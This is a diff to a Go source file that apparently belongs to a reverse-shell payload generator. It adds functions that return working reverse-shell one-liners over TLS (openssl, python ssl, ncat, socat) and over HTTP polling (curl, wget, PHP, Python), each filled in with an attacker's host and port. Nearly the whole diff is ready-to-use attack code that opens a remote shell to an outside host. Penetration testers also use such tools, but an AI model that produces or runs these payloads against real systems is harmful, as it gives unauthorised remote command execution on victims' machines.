@@ -210,3 +210,85 @@ func Awk(lhost string, lport int) string {
 		lhost, lport,
 	)
 }
+
+// --- TLS reverse shells ---
+
+// BashTLS returns a bash reverse shell over TLS using openssl s_client.
+func BashTLS(lhost string, lport int) string {
+	return fmt.Sprintf(
+		"mkfifo /tmp/f;openssl s_client -quiet -connect %s:%d < /tmp/f 2>/dev/null | /bin/sh > /tmp/f 2>&1;rm /tmp/f",
+		lhost, lport,
+	)
+}
+
+// PythonTLS returns a Python3 reverse shell over TLS.
+func PythonTLS(lhost string, lport int) string {
+	return fmt.Sprintf(
+		`python3 -c 'import socket,subprocess,os,ssl;`+
+			`s=socket.socket();`+
+			`s=ssl.wrap_socket(s);`+
+			`s.connect(("%s",%d));`+
+			`os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`+
+			`subprocess.call(["/bin/sh","-i"])'`,
+		lhost, lport,
+	)
+}
+
+// NcatTLS returns a ncat reverse shell over TLS.
+func NcatTLS(lhost string, lport int) string {
+	return fmt.Sprintf("ncat --ssl -e /bin/sh %s %d", lhost, lport)
+}
+
+// SocatTLS returns a socat reverse shell over TLS with TTY.
+func SocatTLS(lhost string, lport int) string {
+	return fmt.Sprintf(
+		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0",
+		lhost, lport,
+	)
+}
+
+// --- WebSocket reverse shells ---
+
+// --- HTTP reverse shells ---
+
+// CurlHTTP returns a curl-based HTTP reverse shell (polling).
+func CurlHTTP(lhost string, lport int) string {
+	return fmt.Sprintf(
+		`while true;do c=$(curl -s http://%s:%d/cmd);`+
+			`[ -z "$c" ]&&sleep 0.2&&continue;`+
+			`o=$(sh -c "$c" 2>&1);`+
+			`curl -s -d "$o" http://%s:%d/out;done`,
+		lhost, lport, lhost, lport,
+	)
+}
+
+// WgetHTTP returns a wget-based HTTP reverse shell (polling).
+func WgetHTTP(lhost string, lport int) string {
+	return fmt.Sprintf(
+		`while true;do c=$(wget -qO- http://%s:%d/cmd);`+
+			`[ -z "$c" ]&&sleep 0.2&&continue;`+
+			`o=$(sh -c "$c" 2>&1);`+
+			`wget -qO- --post-data="$o" http://%s:%d/out;done`,
+		lhost, lport, lhost, lport,
+	)
+}
+
+// PHPHTTP returns a PHP HTTP reverse shell (polling).
+func PHPHTTP(lhost string, lport int) string {
+	return fmt.Sprintf(
+		`php -r '$h="http://%s:%d";while(1){$c=@file_get_contents("$h/cmd");`+
+			`if(!$c){usleep(200000);continue;}`+
+			`$o=shell_exec($c);`+
+			`$ctx=stream_context_create(["http"=>["method"=>"POST","content"=>$o]]);`+
+			`@file_get_contents("$h/out",false,$ctx);}'`,
+		lhost, lport,
+	)
+}
+
+// PythonHTTP returns a Python3 HTTP reverse shell (polling).
+func PythonHTTP(lhost string, lport int) string {
+	return fmt.Sprintf(
+		`python3 -c 'import urllib.request as u,subprocess as s,time;h="http://%s:%d";exec("""\nwhile 1:\n try:\n  c=u.urlopen(h+"/cmd").read().decode()\n  if not c:time.sleep(0.2);continue\n  r=s.run(c,shell=1,capture_output=1)\n  u.urlopen(u.Request(h+"/out",data=r.stdout+r.stderr))\n except:time.sleep(1)\n""")'`,
+		lhost, lport,
+	)
+}
